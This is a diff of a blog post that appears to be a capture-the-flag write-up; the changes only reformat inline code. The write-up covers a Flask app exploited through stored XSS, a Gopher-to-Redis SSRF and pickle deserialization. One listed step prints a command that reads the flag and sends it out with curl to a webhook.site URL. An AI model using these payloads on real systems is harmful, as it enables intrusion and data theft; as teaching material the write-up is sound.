@@ -118,7 +118,7 @@ The Docker container compiles a flag reader program written in C and assigns it 
 
 From the information provided about the application's build files, we can gather the following insights:
 
-1. The web application does not directly call the **`readflag`** binary. To interact with this binary, it will require a remote code execution (RCE) vulnerability in the application to execute arbitrary code or commands.
+1. The web application does not directly call the `readflag` binary. To interact with this binary, it will require a remote code execution (RCE) vulnerability in the application to execute arbitrary code or commands.
 2. The permission value `4755` indicates that the `readflag` binary has the setuid bit set. The set permission value means that if the `readflag` user owns the root binary, it runs under the `root` user's permissions.
 
 So let’s begin our comprehensive review of the complete application.
@@ -321,7 +321,7 @@ def logout():
 ```
 *`routes.py`*
 
-Upon reviewing **`routes.py`**, it becomes apparent that this file plays a crucial role in the assessment as it contains key functions for the site's functionality. When examining the original functionality of the site, the **`request_quote()`** function executes after submitting a quote request.
+Upon reviewing `routes.py`, it becomes apparent that this file plays a crucial role in the assessment as it contains key functions for the site's functionality. When examining the original functionality of the site, the `request_quote()` function executes after submitting a quote request.
 
 ![I'm inspecting the functionality of the GET A QUOTE button; notice how the event is a `POST` request made to `/api/request-quote`. This `request-quote` should be our most scrutinized potential entry point for exploitation. If I didn't care about the stack technologies utilized by the application, we could have just jumped to an analysis on this function rather than reviewing the build files, `main`, and more.; I viewed this as an assessment, so I wanted to be as thorough as possible.](/img/Hacking_the_Modern_Stack/Untitled%203.png)
 *I'm inspecting the functionality of the GET A QUOTE button; notice how the event is a `POST` request made to `/api/request-quote`. This `request-quote` should be our most scrutinized potential entry point for exploitation. If I didn't care about the stack technologies utilized by the application, we could have just jumped to an analysis on this function rather than reviewing the build files, `main`, and more.; I viewed this as an assessment, so I wanted to be as thorough as possible.*
@@ -424,9 +424,9 @@ def dashboard():
     return render_template('requests.html', requests=quote_requests)
 ```
 
-This analysis shows that the **`dashboard()`** function, accessed through the **`/admin/quote-requests`** route, requires admin login authentication. It retrieves all quote requests from the database and passes them to the **`requests.html`** template for rendering.
+This analysis shows that the `dashboard()` function, accessed through the `/admin/quote-requests` route, requires admin login authentication. It retrieves all quote requests from the database and passes them to the `requests.html` template for rendering.
 
-In the **`requests.html`** template, a peculiar line stands out: **`<p class="card-text">Request Message : {{ request.quote_message | safe }}</p>`**. This line indicates a security vulnerability related to the use of the [safe filter in Jinja](https://jinja.palletsprojects.com/en/3.0.x/templates/#working-with-automatic-escaping), the default template engine for Python applications.
+In the `requests.html` template, a peculiar line stands out: `<p class="card-text">Request Message : {{ request.quote_message | safe }}</p>`. This line indicates a security vulnerability related to the use of the [safe filter in Jinja](https://jinja.palletsprojects.com/en/3.0.x/templates/#working-with-automatic-escaping), the default template engine for Python applications.
 
 Here's an analysis of the code snippet:
 
@@ -434,10 +434,10 @@ Here's an analysis of the code snippet:
 <p class="card-text">Request Message : {{ request.quote_message | safe }}</p>
 ```
 
-1. The template displays the quote request message using **`{{ request.quote_message }}`**.
-2. The **`| safe`** filter applies to the **`request.quote_message`** variable.
-3. In Jinja, the **`safe`** filter marks the content as safe, turning off the automatic escaping that occurs by default.
-4. Using the **`safe`** filter, any JavaScript code or other potentially harmful content within the **`quote_message`** executes as-is when rendering the template.
+1. The template displays the quote request message using `{{ request.quote_message }}`.
+2. The `| safe` filter applies to the `request.quote_message` variable.
+3. In Jinja, the `safe` filter marks the content as safe, turning off the automatic escaping that occurs by default.
+4. Using the `safe` filter, any JavaScript code or other potentially harmful content within the `quote_message` executes as-is when rendering the template.
 
 The usage of `safe` poses a security risk because the `quote_message` can be user-generated or manipulated by an attacker; it allows the execution of arbitrary JavaScript code within the context of the admin user's privileges.
 
@@ -450,7 +450,7 @@ I confirmed this XSS using an ephemeral webhook at [https://webhook.site](https:
 
 ## Exploring the Possibilities of Executing Arbitrary JavaScript as ADMIN <a name="exploring-xss"></a>
 
-In the **`routes.py`** file, we encounter an API endpoint **`/admin/scrape`** associated with the **`scrape_list()`** function. Let's analyze the code snippet:
+In the `routes.py` file, we encounter an API endpoint `/admin/scrape` associated with the `scrape_list()` function. Let's analyze the code snippet:
 
 ```python
 @web.route('/admin/scrape')
@@ -462,12 +462,12 @@ def scrape_list():
 
 Here's what we can understand from the code:
 
-1. The **`/admin/scrape`** endpoint is handled by the **`scrape_list()`** function.
-2. The **`@login_required`** decorator ensures that only authenticated users can access the **`scrape_list()`** route.
-3. Inside the **`scrape_list()`** function, all quote requests are retrieved from the database using **`QuoteRequests.query.all()`**.
-4. The retrieved quote requests are then passed as variable `requests` to the **`scrape.html`** template using the **`render_template()`** function.
+1. The `/admin/scrape` endpoint is handled by the `scrape_list()` function.
+2. The `@login_required` decorator ensures that only authenticated users can access the `scrape_list()` route.
+3. Inside the `scrape_list()` function, all quote requests are retrieved from the database using `QuoteRequests.query.all()`.
+4. The retrieved quote requests are then passed as variable `requests` to the `scrape.html` template using the `render_template()` function.
 
-Based on this information, the **`/admin/scrape`** endpoint retrieves all quote requests and renders them in the **`scrape.html`** template. The specific functionality and purpose of the **`scrape.html`** template may provide more insights into the intended use of this API.
+Based on this information, the `/admin/scrape` endpoint retrieves all quote requests and renders them in the `scrape.html` template. The specific functionality and purpose of the `scrape.html` template may provide more insights into the intended use of this API.
 
 Looking at `config.py`, I knew that the admin password was going to be 30 characters, so there's no way we'll be able to brute force that:
 
@@ -573,7 +573,7 @@ from application.cache import get_job_list, create_job_queue, get_job_queue, get
 ```
 *Some of the imports at the top of `routes.py`* 
 
-Indeed, in the **`cache.py`** file, we find the **`create_job_queue(urls, job_title)`** function, which involves using Redis for caching jobs and queuing them for processing.
+Indeed, in the `cache.py` file, we find the `create_job_queue(urls, job_title)` function, which involves using Redis for caching jobs and queuing them for processing.
 
 ```python
 def create_job_queue(urls, job_title):
@@ -599,7 +599,7 @@ Here we see Redis is caching jobs with the variable `REDIS_JOBS` and queuing the
 
 More importantly, we can see that the data for the job is leveraging `pickle.dumps(data)`. `pickle.dumps(data)` serializes data; usually, where there is serialization, the serialized data has to be deserialized by the application at some point so the application can use the data when recalling the stored, serialized data. The serialized format is likely in use for efficient storage and retrieval of data.
 
-When the application needs to retrieve the stored job data, it would typically deserialize it using the corresponding deserialization method (**`pickle.loads()`** in the case of Pickle). Deserialization allows the application to reconstruct the original object and use the data within the application's context.
+When the application needs to retrieve the stored job data, it would typically deserialize it using the corresponding deserialization method (`pickle.loads()` in the case of Pickle). Deserialization allows the application to reconstruct the original object and use the data within the application's context.
 
 From my experience with deserialization exploitation, [the pickle module should only be in use with data you trust](https://docs.python.org/3/library/pickle.html). Since we can send our data to the serializer when data deserializes by `get_job_queue(job_id)`, we should have the ability to inject our own serialized data for code execution:
 
@@ -805,11 +805,11 @@ print(gopher_payload)
 
 Let’s step through my Gopher payload generator. 
 
-1. The code defines a class **`RCE`** that implements the **`__reduce__()`** method. This method specifies the actions that perform during pickle deserialization. In this case, the command executed is**`/readflag | base64 -w 0 > /tmp/flag; curl https://webhook.site/<YOUR_GUID>?flag="$(cat /tmp/flag)"`**. Modify **`<YOUR_GUID>`** with your actual webhook site GUID.
-2. The **`pickle.dumps(RCE())`** statement serializes the **`RCE`** object into a pickle byte string.
-3. The pickled payload is then base64 encoded using **`base64.b64encode()`** and converted to an ASCII string using **`decode('ascii')`**. The encoded payload is storing itself in the **`payload_b64`** variable.
-4. The **`redis_cmd`** variable holds the Redis command that executes. In this case, an `hset` command sets the payload in the **`jobs`** hash with the key **`2813308004`**. This key is arbitrary and can be set to any digit. 
-5. The **`gopher_payload`** variable contains the Gopher payload constructed using the Redis command. It replaces newline characters (**`\n`**) and carriage return characters (**`\r`**) with their URL-encoded equivalents (**`%0D%0A`**) and spaces with **`%20`**. The payload is prefixed with the Gopher URL scheme (**`gopher://`**) and the Redis server details (**`127.0.0.1:6379`**).
+1. The code defines a class `RCE` that implements the `__reduce__()` method. This method specifies the actions that perform during pickle deserialization. In this case, the command executed is`/readflag | base64 -w 0 > /tmp/flag; curl https://webhook.site/<YOUR_GUID>?flag="$(cat /tmp/flag)"`. Modify `<YOUR_GUID>` with your actual webhook site GUID.
+2. The `pickle.dumps(RCE())` statement serializes the `RCE` object into a pickle byte string.
+3. The pickled payload is then base64 encoded using `base64.b64encode()` and converted to an ASCII string using `decode('ascii')`. The encoded payload is storing itself in the `payload_b64` variable.
+4. The `redis_cmd` variable holds the Redis command that executes. In this case, an `hset` command sets the payload in the `jobs` hash with the key `2813308004`. This key is arbitrary and can be set to any digit. 
+5. The `gopher_payload` variable contains the Gopher payload constructed using the Redis command. It replaces newline characters (`\n`) and carriage return characters (`\r`) with their URL-encoded equivalents (`%0D%0A`) and spaces with `%20`. The payload is prefixed with the Gopher URL scheme (`gopher://`) and the Redis server details (`127.0.0.1:6379`).
 6. Finally, the constructed Gopher command prints to the console for use in the stored XSS proof of concept.
 
 With our newly created Gopher URL, which interacts with the loopback address for Redis, we should be ready to poison the Redis Cache with our stored XSS: 
@@ -877,7 +877,7 @@ I failed to use XSS directly to insert the job into Redis; the browser cannot in
 
 ### Stored cross-site scripting (XSS)
 
-1. Removing the **`| safe`** filter and applying proper input sanitization and validation before displaying user-generated content is recommended to mitigate this vulnerability. It is crucial to ensure that user input is adequately escaping or sanitized to prevent cross-site scripting (XSS) attacks and maintain the application's security.
+1. Removing the `| safe` filter and applying proper input sanitization and validation before displaying user-generated content is recommended to mitigate this vulnerability. It is crucial to ensure that user input is adequately escaping or sanitized to prevent cross-site scripting (XSS) attacks and maintain the application's security.
 
 ### Redis Cache Poisoning
 
